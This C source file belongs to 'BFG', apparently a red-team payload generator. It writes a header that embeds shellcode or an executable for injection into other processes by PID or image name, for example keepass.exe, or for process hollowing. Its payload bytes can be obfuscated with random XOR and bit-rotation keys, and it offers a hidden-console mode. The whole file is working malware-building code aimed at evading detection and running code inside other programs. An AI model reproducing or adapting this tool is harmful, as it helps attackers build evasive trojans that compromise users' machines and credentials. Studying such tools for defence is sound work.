/*
Authors: Daniel Sauder, Florian Saager
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/bfg
*/
 
#include <getopt.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>


void print_start();
void print_help();
int print_debug;
int load_from_file;


int main (int argc, char **argv)
{
	print_start();

	print_debug = 0;
	load_from_file = 0;
	char *evalue = NULL;
	char *fvalue = NULL;
	char *ivalue = NULL;
	char *Ivalue = NULL;
	char *Hvalue = NULL;
	int hflag = 0;
	int Fflag = 0;
	int Xflag = 0;
	int Eflag = 0;
	int Aflag = 0;
	int qflag = 0;
	int Pflag = 0;
	int dflag = 0;
	int xflag = 0;
	int aflag = 0;

	int index;
	int c;

	opterr = 0;

	// compute the options
	while ((c = getopt (argc, argv, "e:f:i:H:I:lphFXqPdxa")) != -1)	
	{		
		switch (c)			
		{
			case 'e':
				evalue = optarg;
				break;
			case 'l':
				load_from_file = 1;
				break;
			case 'f':
				fvalue = optarg;
				break;
			case 'i':
				ivalue = optarg;
				break;
			case 'I':
				Ivalue = optarg;
			    break;
			case 'H':
				Hvalue = optarg;
				break;
			case 'd':
				dflag = 1;
				break;
			case 'h':
				hflag = 1;
				break;
			case 'F':
				Fflag = 1;
				break;
			case 'X':
				Xflag = 1;
				break;
			case 'q':
				qflag = 1;
				break;
			case 'P':
				Pflag = 1;
				break;
			case 'x':
				xflag = 1;
				break;
			case 'p':
				print_debug = 1;
				break;
			case 'a':
				aflag = 1;
				break;
			case '?':
				if (optopt == 'e')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'f')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'i')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'I')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);	
				else if (optopt == 'H')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);	
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				else
					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return 1;
			default:
				abort ();
		}
	}

	// print help
	if (hflag)
		print_help();
	else if (load_from_file)
	{
		//write LVALUE to defs.h
		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		fprintf (file_def, "#define LVALUE\n");
		fclose(file_def);
	}
	
	// write shellcode from a given file to defs.h
	else if (fvalue)
	{
		printf ("write shellcode from %s to defs.h\n", fvalue);

		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		fseek (file_def, 0, SEEK_END);

		// read the shellcode file, write to defs.h
		FILE *file_sh = fopen ( fvalue, "r" );

		if ( file_sh != NULL )
		{
			if(Eflag)
				fprintf (file_def, "#define FVALUE \"");
			else
				fprintf (file_def, "#define FVALUE \"\"\n");

			char line [ 5000 ];

			while ( fgets ( line, sizeof line, file_sh ) != NULL )
				fprintf (file_def, "%s", line);           

			if(Eflag)
				fprintf (file_def, "\"\n");
			//fprintf (file_def, "\\n");
			fclose ( file_sh );
		}
		else
			printf ("Error open %s\n", fvalue);

		fclose (file_def);
	}

	//inject
	if(ivalue)
	{
		if (strcmp(ivalue, "shellcode")==0)
		{
			FILE *file_def;
			file_def = fopen ("defs.h","a");
			fprintf (file_def, "#define INJECT_SHELLCODE\n");
			fclose (file_def);
		}
		else if (strcmp(ivalue, "dll")==0)
		{
			FILE *file_def;
			file_def = fopen ("defs.h","a");
			fprintf (file_def, "#define INJECT_DLL\n");
			fclose (file_def);

		}	
		else
			printf("-i %s unknown option\n", ivalue);
	}
	
	// Process Hollowing
	if(Hvalue)
	{
		printf("Write executable from %s to defs.h\n", Hvalue);
		
		unsigned char keyByte0;
		unsigned char keyByte1;
		
		// Initialize RNG
		time_t t;
		srand((unsigned) time(&t));
		
		if(xflag) {
			// Generate random key byte
			keyByte0 = rand() % 256;
		} else if(aflag) {
			// Generate two random key bytes
			keyByte0 = rand() % 256;
			keyByte1 = rand() % 256;
		}
					
		FILE *file_exe = fopen(Hvalue, "r");
		FILE *file_def = fopen("defs.h", "a");
		
		int currentChar = 0;
		unsigned char currentByte = 0;
		long currentSize = 0;
	
		// Read data from excutable file and write bytewise into array "payload" in defs.h
		fprintf(file_def, "\n unsigned char payload[] = {");
		
		unsigned int imod = 0;
		unsigned int keymod = 0;
		unsigned char savedBits = 0;
		for(int i = 0;;i++) 
		{
			if ((currentChar = fgetc(file_exe)) == EOF) break;			
			if (i != 0) fprintf(file_def, ",");
			if ((i % 12) == 0) fprintf(file_def, "\n\t");
			
			// Make extra conversion because bitwise operations get messy on signed integer type
			// Keep integer type while checking for EOF because EOF is a negative, implementation-dependent value
			currentByte = (unsigned char) currentChar;
			
			if(xflag) {
				// XOR the byte with the generated key before writing it into the array
				currentByte = currentByte ^ keyByte0;
			} else if(aflag) {
				imod = i%4;
				// Use a cycle of four different instructions, using two key bytes
				switch(imod) {					
					case 0:
						// XOR - XOR (keyByte0)
						currentByte = currentByte ^ keyByte0;		
						break;						
					case 1:
						// INC - DEC
						currentByte++;						
						break;						
					case 2:
						// NOT - NOT
						currentByte = currentByte ^ 0xFF;
						break;						
					case 3:
						// Compute keymod = keyByte1 mod 8
						// Swap the keymod rightmost bits with the other bits of the byte						
						keymod = keyByte1 % 8;
						savedBits = currentByte >> keymod;
						currentByte = currentByte << (8 - keymod);
						currentByte = currentByte ^ savedBits;
						break;					
					default:
						// default case should never happen - do nothing
						break;
				}				
			}
			fprintf(file_def, "0x%.2X", currentByte);
			currentSize++;
		}
		
		fprintf(file_def, "};");
		
		// Write payload size in bytes into defs.h
		fprintf(file_def, "\nlong payloadSize = %ld;\n", currentSize);
		
		if(xflag) {
			// Write key byte value into defs.h
			fprintf(file_def, "\nunsigned char keyByte0 = 0x%.2X;\n", keyByte0);
			// Set define for XOR_OBFUSCATION
			fprintf(file_def, "\n#define XOR_OBFUSCATION\n");
		} else if(aflag) {
			// Write key byte values into defs.h
			fprintf(file_def, "\nunsigned char keyByte0 = 0x%.2X;\n", keyByte0);
			fprintf(file_def, "\nunsigned char keyByte1 = 0x%.2X;\n", keyByte1);
			// Set define for ALT_OBFUSCATION
			fprintf(file_def, "\n#define ALT_OBFUSCATION\n");
		}	
		
		// Set define for PROCESS_HOLLOWING
		fprintf(file_def, "\n#define PROCESS_HOLLOWING\n");
		
		// Close file handles
		fclose(file_def);
		fclose(file_exe);
	}

	//Image name
	if(Ivalue)
	{
		FILE *file_def;
		file_def = fopen ("defs.h","a");
		fseek (file_def, 0, SEEK_END);
		fprintf (file_def, "#define IMAGE \"%s\"\n", Ivalue);
		fclose (file_def);
	}

	//write flags to defs.h
	FILE *file_def;
	file_def = fopen ("defs.h","a");
	if (file_def == NULL)
	{
		printf ("Error open defs.h\n");
		return -1;
	}

	//write LVALUE to defs.h
	if(print_debug)
		fprintf (file_def, "#define PRINT_DEBUG\n");

	//write X64 to defs.h
	if(Xflag)
		fprintf (file_def, "#define X64\n");

	if(qflag)
		fprintf (file_def, "#define QUIET\n");

	if(Pflag)
		fprintf (file_def, "#define PID\n");

	if(dflag)
		fprintf (file_def, "#define LOADEXEC_DLL\n");

	fclose(file_def);

} //main

void print_help()
{
	printf("Options:\n");
	printf("-i inject\n");
	printf("\t-i shellcode to be used for shellcode injection\n");
	printf("\t-i dll dll injection\n");
	//printf("\t-i exe for injecting an executable\n");	
	printf("-H Hollow target process and insert payload executable. Usage: bfg.exe target.exe\n");
	printf("\tSet -x flag to XOR-obfuscate the payload with a random byte key\n");
	printf("\tSet -a flag to use alternative obfuscation which is a little more complex\n");
	printf("\tIt would be unwise to use both obfuscations at once. You have been warned...\n");
	printf("\tSet -X flag to specify that the hollowing target is a 64 bit process\n");
	printf("-P inject shellcode by PID as argument, call bfg.exe PID for sc and bfg.exe my.dll PID for dll injection\n");
	printf("-I inject shellcode by image name, call for example: pwn.exe keepass.exe\n");	
	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin\n");
	printf("-f compile and insert shellcode into .exe, needs filename of shellcode file\n");
	printf("-X compile for amd64 architecture\n");
	printf("-p print debug information\n");
	printf("-q quiet mode (hide console window)\n");
	printf("-h help\n\n");
	printf("Please check the README.md for more information\n");
}

void print_start()
{
//http://patorjk.com/software/taag/#p=display&f=3D-ASCII&t=BFG
char output[] =
" ________  ________ ________     \n"
"|\\   __  \\|\\  _____\\\\   ____\\ \n"   
"\\ \\  \\|\\ /\\ \\  \\__/\\ \\  \\___| \n"   
" \\ \\   __  \\ \\   __\\\\ \\  \\  ___  \n"
"  \\ \\  \\|\\  \\ \\  \\_| \\ \\  \\|\\  \\ \n"
"   \\ \\_______\\ \\__\\   \\ \\_______\\ \n"
"    \\|_______|\\|__|    \\|_______| \n"
		"\n\nBinary Fancy Generator by Daniel Sauder, Florian Saager\n"
		"use -h for help\n\n";
	printf("\n%s", output);
}
